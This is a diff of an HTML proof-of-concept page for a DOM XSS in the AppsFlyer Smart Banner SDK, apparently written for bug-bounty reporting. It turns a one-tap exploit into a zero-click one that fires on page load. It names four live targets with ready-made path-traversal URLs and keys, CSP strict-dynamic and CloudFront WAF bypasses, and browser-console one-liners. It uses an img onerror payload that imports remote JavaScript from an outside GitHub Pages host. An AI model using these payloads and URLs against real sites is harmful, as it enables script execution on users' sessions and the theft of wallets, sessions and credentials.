@@ -3,89 +3,83 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AppsFlyer Smart Banner XSS — PoC Hub</title>
+<title>AppsFlyer Smart Banner XSS — Zero-Click PoC</title>
 <style>
-  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', monospace; max-width: 900px; margin: 0 auto; padding: 20px; background: #0d1117; color: #c9d1d9; }
-  h1 { color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
-  h2 { color: #f0883e; margin-top: 30px; }
-  .target { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 16px; margin: 12px 0; }
-  .target h3 { color: #7ee787; margin: 0 0 8px 0; }
-  .csp { color: #f85149; font-size: 13px; }
-  .url { background: #0d1117; border: 1px solid #30363d; padding: 8px 12px; border-radius: 6px; word-break: break-all; font-size: 12px; color: #79c0ff; margin: 8px 0; }
-  .method { color: #d2a8ff; font-size: 13px; }
-  code { background: #21262d; padding: 2px 6px; border-radius: 4px; font-size: 12px; color: #f0883e; }
-  pre { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 12px; overflow-x: auto; }
-  pre code { background: none; color: #c9d1d9; }
-  .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: bold; }
-  .badge-confirmed { background: #1a7f37; color: white; }
-  .badge-csp { background: #da3633; color: white; }
-  .badge-waf { background: #bf8700; color: black; }
+  body{font-family:-apple-system,BlinkMacSystemFont,monospace;max-width:900px;margin:0 auto;padding:20px;background:#0d1117;color:#c9d1d9}
+  h1{color:#f85149;border-bottom:1px solid #30363d;padding-bottom:10px}
+  h2{color:#f0883e;margin-top:30px}
+  .target{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin:12px 0}
+  .target h3{color:#7ee787;margin:0 0 8px}
+  .csp{color:#f85149;font-size:13px}
+  .url{background:#0d1117;border:1px solid #30363d;padding:8px;border-radius:6px;word-break:break-all;font-size:12px;color:#79c0ff;margin:8px 0}
+  code{background:#21262d;padding:2px 6px;border-radius:4px;font-size:12px;color:#f0883e}
+  pre{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;overflow-x:auto}
+  pre code{background:none;color:#c9d1d9}
+  .badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:bold}
+  .badge-confirmed{background:#1a7f37;color:#fff}
+  .badge-zeroclick{background:#da3633;color:#fff}
+  .badge-waf{background:#bf8700;color:#000}
 </style>
 </head>
 <body>
 
-<h1>AppsFlyer Smart Banner XSS — PoC Hub</h1>
-<p>Path traversal in <code>af-sb-id</code> → innerHTML injection → arbitrary JS execution on victim origin.</p>
+<h1>AppsFlyer Smart Banner XSS — Zero-Click PoC</h1>
+<p><strong>DOM XSS that fires on page load — no user interaction required.</strong></p>
+<p>Path traversal in <code>af-sb-id</code> → creative layout injected via <code>innerHTML</code> (no sanitization) → <code>&lt;img onerror&gt;</code> fires automatically → arbitrary JS execution on victim origin.</p>
 
 <h2>Confirmed Exploitable Targets</h2>
 
 <div class="target">
-  <h3>1. discover.moonpay.com <span class="badge badge-confirmed">CONFIRMED</span></h3>
-  <p class="csp">CSP: report-only (not enforced)</p>
-  <p class="method">Method: javascript: URI in &lt;a href&gt; — auto-renders, one tap to fire</p>
+  <h3>1. discover.moonpay.com <span class="badge badge-confirmed">CONFIRMED</span> <span class="badge badge-zeroclick">ZERO-CLICK</span></h3>
+  <p class="csp">CSP: report-only (not enforced) — <code>&lt;img onerror&gt;</code> executes freely</p>
+  <p><strong>Auto-fires:</strong> SDK calls <code>AF('banners','showBanner')</code> on load → creative injected → <code>&lt;img onerror&gt;</code> fires</p>
   <div class="url">https://discover.moonpay.com/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad</div>
   <p>AF Key: <code>8f526d7c-6f31-499a-8f25-f9197433ab15</code></p>
-  <p>Open on mobile → purple banner appears → tap "CLICK HERE" → <code>alert(origin)</code></p>
 </div>
 
 <div class="target">
-  <h3>2. www.rapido.bike <span class="badge badge-confirmed">CONFIRMED</span></h3>
-  <p class="csp">CSP: unsafe-inline + https: (no hashes)</p>
-  <p class="method">Method: javascript: URI in &lt;a href&gt; — auto-renders, one tap to fire</p>
+  <h3>2. www.rapido.bike <span class="badge badge-confirmed">CONFIRMED</span> <span class="badge badge-zeroclick">ZERO-CLICK</span></h3>
+  <p class="csp">CSP: unsafe-inline + https: (no hashes) — <code>&lt;img onerror&gt;</code> executes freely</p>
+  <p><strong>Auto-fires:</strong> SDK calls <code>AF('banners','showBanner')</code> on load</p>
   <div class="url">https://www.rapido.bike/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad</div>
   <p>AF Key: <code>ac0b6bf2-d76d-403f-9819-fbfc4b43a227</code></p>
-  <p>Open on mobile → purple banner appears → tap "CLICK HERE" → <code>alert(origin)</code></p>
 </div>
 
 <div class="target">
-  <h3>3. wolt.com <span class="badge badge-confirmed">CONFIRMED (CSP bypass)</span> <span class="badge badge-waf">WAF bypass</span></h3>
-  <p class="csp">CSP: strict-dynamic + sha256 hashes</p>
-  <p class="method">Method: createElement('script') bypasses strict-dynamic. Use console one-liner (Wolt doesn't auto-call showBanner).</p>
+  <h3>3. wolt.com <span class="badge badge-confirmed">CONFIRMED</span> <span class="badge badge-waf">WAF bypass</span></h3>
+  <p class="csp">CSP: strict-dynamic + sha256 hashes — CSP bypassed via createElement('script')</p>
+  <p>WAF: CloudFront blocks <code>../</code> → backslash <code>..%5c</code> bypass</p>
   <div class="url">https://wolt.com/?af-sb-id=..%5c..%5ce09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad</div>
   <p>AF Key: <code>975bd8df-385d-4212-a530-723547e35f1f</code></p>
-  <p>WAF: CloudFront blocks <code>../</code> → backslash <code>..%5c</code> bypass</p>
-  <p>Reproduce: Open DevTools Console, paste:</p>
-  <pre><code>(async(k,a)=>{const u=new URL(`https://banner.appsflyersdk.com/sb/${k}/creative/../../${a}/preview`);const b=(await(await fetch(u.href)).json())[0];const c=await(await fetch(b.creative_url)).json();const w=document.createElement('div');w.innerHTML=c.layout;document.body.insertBefore(w.querySelector('#smart-banner'),document.body.firstChild);const s=document.createElement('script');s.innerHTML=`import('//s1n6h.github.io/x.js')`;document.body.appendChild(s);})('975bd8df-385d-4212-a530-723547e35f1f','e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad')</code></pre>
+  <p>Console one-liner (Wolt doesn't auto-call showBanner):</p>
+  <pre><code>(async(k,a)=>{const u=new URL(`https://banner.appsflyersdk.com/sb/${k}/creative/../../${a}/preview`);const b=(await(await fetch(u.href)).json())[0];const c=await(await fetch(b.creative_url)).json();const w=document.createElement('div');w.innerHTML=c.layout;document.body.insertBefore(w.querySelector('#smart-banner'),document.body.firstChild);const p=document.createElement('div');p.innerHTML='<img src=x onerror="import(\'//s1n6h.github.io/x.js\')">';document.body.appendChild(p);})('975bd8df-385d-4212-a530-723547e35f1f','e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad')</code></pre>
 </div>
 
 <div class="target">
-  <h3>4. uat-bugbounty.nonprod.syfe.com <span class="badge badge-confirmed">CONFIRMED (CSP bypass)</span> <span class="badge badge-waf">WAF bypass</span></h3>
-  <p class="csp">CSP: unsafe-inline (no hashes) — script field injection works</p>
-  <p class="method">Method: createElement('script') — same console one-liner</p>
+  <h3>4. uat-bugbounty.nonprod.syfe.com <span class="badge badge-confirmed">CONFIRMED</span> <span class="badge badge-waf">WAF bypass</span></h3>
+  <p class="csp">CSP: unsafe-inline (no hashes) — createElement script injection works</p>
   <div class="url">https://uat-bugbounty.nonprod.syfe.com/?af-sb-id=..%5c..%5ce09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad</div>
   <p>AF Key: <code>06f29ce3-9820-46e7-83c7-ff715c3fb64b</code></p>
-  <p>Reproduce: Open DevTools Console, paste:</p>
-  <pre><code>(async(k,a)=>{const u=new URL(`https://banner.appsflyersdk.com/sb/${k}/creative/../../${a}/preview`);const b=(await(await fetch(u.href)).json())[0];const c=await(await fetch(b.creative_url)).json();const w=document.createElement('div');w.innerHTML=c.layout;document.body.insertBefore(w.querySelector('#smart-banner'),document.body.firstChild);const s=document.createElement('script');s.innerHTML=`import('//s1n6h.github.io/x.js')`;document.body.appendChild(s);})('06f29ce3-9820-46e7-83c7-ff715c3fb64b','e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad')</code></pre>
+  <pre><code>(async(k,a)=>{const u=new URL(`https://banner.appsflyersdk.com/sb/${k}/creative/../../${a}/preview`);const b=(await(await fetch(u.href)).json())[0];const c=await(await fetch(b.creative_url)).json();const w=document.createElement('div');w.innerHTML=c.layout;document.body.insertBefore(w.querySelector('#smart-banner'),document.body.firstChild);const p=document.createElement('div');p.innerHTML='<img src=x onerror="import(\'//s1n6h.github.io/x.js\')">';document.body.appendChild(p);})('06f29ce3-9820-46e7-83c7-ff715c3fb64b','e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad')</code></pre>
 </div>
 
-<h2>How It Works</h2>
+<h2>How the Zero-Click Works</h2>
 <ol>
-  <li><strong>Path traversal:</strong> <code>af-sb-id</code> has no UUID validation. <code>../../</code> traverses to attacker's AF workspace key + creative.</li>
-  <li><strong>innerHTML sink:</strong> Creative layout HTML injected via <code>_createElement()</code> → <code>div.innerHTML = layout</code> with no sanitization.</li>
-  <li><strong>javascript: URI:</strong> HTML entity <code>&#x73;</code> decodes to <code>s</code> → <code>href="javascript:import('//s1n6h.github.io/x.js')"</code> survives in DOM.</li>
-  <li><strong>CSP bypass:</strong> SDK's <code>_inject()</code> creates <code>&lt;script&gt;</code> via <code>document.createElement('script')</code> + <code>innerHTML</code> + <code>appendChild</code>. This is a dynamically-inserted script, which <code>strict-dynamic</code> trusts → bypasses CSP.</li>
-  <li><strong>WAF bypass:</strong> CloudFront blocks <code>../</code> in query strings. Backslash <code>..%5c</code> bypasses WAF. Browser normalizes <code>\</code> → <code>/</code> in HTTPS URL paths (WHATWG URL spec).</li>
+  <li><strong>Path traversal:</strong> <code>af-sb-id</code> has no validation. <code>../../</code> traverses to attacker's AF workspace.</li>
+  <li><strong>Auto-render:</strong> SDK calls <code>showBanner()</code> on page load → fetches attacker's creative → injects via <code>innerHTML</code>.</li>
+  <li><strong>Zero-click payload:</strong> Creative layout contains <code>&lt;img src=x onerror="import('//s1n6h.github.io/x.js')"&gt;</code>. When <code>innerHTML</code> parses it, the image fails to load → <code>onerror</code> fires automatically → imports and executes x.js on the victim's origin.</li>
+  <li><strong>CSP bypass (strict-dynamic):</strong> SDK's <code>_inject()</code> creates <code>&lt;script&gt;</code> via <code>createElement</code> + <code>innerHTML</code> → dynamically inserted scripts are trusted under strict-dynamic.</li>
+  <li><strong>WAF bypass:</strong> Backslash <code>..%5c</code> bypasses CloudFront WAF. Browser normalizes <code>\</code> → <code>/</code> (WHATWG URL spec).</li>
 </ol>
 
 <h2>Payload: x.js</h2>
-<p>Hosted at: <code>https://s1n6h.github.io/x.js</code></p>
-<p>Currently: <code>alert(origin)</code> (PoC only). In a real attack: wallet drain, session theft, credential exfiltration.</p>
+<p>Hosted at: <a href="https://s1n6h.github.io/x.js">https://s1n6h.github.io/x.js</a></p>
 
 <h2>Root Causes (all in AppsFlyer SDK)</h2>
 <ol>
   <li>No validation on <code>af-sb-id</code> before URL construction</li>
   <li>No HTML sanitization in <code>_createElement()</code> — raw <code>innerHTML</code> sink</li>
-  <li>No filtering of <code>javascript:</code> URIs in creative layouts</li>
+  <li>No filtering of <code>onerror</code> / <code>onload</code> / <code>javascript:</code> in creative layouts</li>
   <li>Creative script field injected via <code>createElement('script')</code> — bypasses CSP</li>
 </ol>
 
